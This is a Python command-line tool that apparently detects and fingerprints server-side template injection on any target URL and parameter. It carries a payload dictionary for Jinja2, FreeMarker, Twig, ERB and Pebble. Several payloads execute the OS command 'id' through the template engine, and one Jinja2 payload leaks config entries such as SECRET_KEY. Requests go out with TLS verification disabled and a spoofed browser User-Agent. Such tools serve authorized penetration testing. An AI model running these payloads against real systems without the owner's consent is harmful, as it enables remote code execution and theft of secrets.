#!/usr/bin/env python3
"""Server-Side Template Injection (SSTI) detection and fingerprinting."""
import argparse
import requests
import json
import sys
import urllib3
urllib3.disable_warnings()

PAYLOADS = {
    "math_generic": [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("<%= 7*7 %>", "49"),
        ("#{7*7}", "49"),
        ("{{7*'7'}}", "7777777"),
        ("${7*7}", "49"),
        ("{{config}}", "Config"),
    ],
    "jinja2": [
        ("{{config.items()}}", "SECRET_KEY"),
        ("{{request.application.__globals__}}", "__builtins__"),
        ("{{''.__class__.__mro__[1].__subclasses__()}}", "subprocess"),
    ],
    "freemarker": [
        ("${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "uid="),
        ("<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "uid="),
    ],
    "velocity": [
        ("#set($x=7*7)${x}", "49"),
    ],
    "twig": [
        ("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}", "uid="),
    ],
    "erb": [
        ("<%= system('id') %>", "uid="),
        ("<%= 7*7 %>", "49"),
    ],
    "pebble": [
        ('{% set cmd = "id" %}{% set bytes = (1).TYPE.forName("java.lang.Runtime").methods[6].invoke(null,null).exec(cmd) %}', "uid="),
    ],
}

def test_param(url, param, method, headers, payloads_dict, data=None):
    results = []
    for category, payloads in payloads_dict.items():
        for payload, expected in payloads:
            try:
                if method.upper() == "GET":
                    test_url = url.replace(f"{param}=FUZZ", f"{param}={requests.utils.quote(payload)}")
                    if "FUZZ" not in url:
                        sep = "&" if "?" in url else "?"
                        test_url = f"{url}{sep}{param}={requests.utils.quote(payload)}"
                    resp = requests.get(test_url, headers=headers, verify=False, timeout=10)
                else:
                    body = data.copy() if data else {}
                    body[param] = payload
                    resp = requests.post(url, json=body, headers=headers, verify=False, timeout=10)

                detected = expected.lower() in resp.text.lower()
                result = {
                    "category": category,
                    "payload": payload,
                    "expected": expected,
                    "detected": detected,
                    "status": resp.status_code,
                    "response_preview": resp.text[:200] if detected else "",
                }
                results.append(result)
                if detected:
                    print(f"  [VULN!] {category}: {payload} → found '{expected}' in response")
                    print(f"          Response: {resp.text[:150]}")
            except Exception as e:
                results.append({"payload": payload, "error": str(e)})
    return results

def main():
    parser = argparse.ArgumentParser(description="SSTI detection and fingerprinting")
    parser.add_argument("url", help="Target URL (use FUZZ as placeholder or specify --param)")
    parser.add_argument("--param", default="q", help="Parameter name to inject into")
    parser.add_argument("--method", default="GET", help="HTTP method")
    parser.add_argument("--data", default=None, help="POST body JSON")
    parser.add_argument("-H", "--header", action="append", default=[])
    parser.add_argument("--json-output", action="store_true")
    parser.add_argument("--quick", action="store_true", help="Only test generic math payloads")
    args = parser.parse_args()

    headers = {"User-Agent": "Mozilla/5.0"}
    for h in args.header:
        k, v = h.split(":", 1)
        headers[k.strip()] = v.strip()

    data = json.loads(args.data) if args.data else None
    test_payloads = {"math_generic": PAYLOADS["math_generic"]} if args.quick else PAYLOADS

    print(f"\nSSTI Detection: {args.url}")
    print(f"Parameter: {args.param} | Method: {args.method}")
    print(f"{'='*60}\n")

    results = test_param(args.url, args.param, args.method, headers, test_payloads, data)

    vulns = [r for r in results if r.get("detected")]
    print(f"\n{'='*60}")
    print(f"Results: {len(vulns)}/{len(results)} payloads triggered")
    if vulns:
        engines = set(r["category"] for r in vulns)
        print(f"Likely template engine: {', '.join(engines)}")

    if args.json_output:
        print(json.dumps({"url": args.url, "param": args.param, "vulnerabilities": vulns, "total_tests": len(results)}, indent=2))

if __name__ == "__main__":
    main()
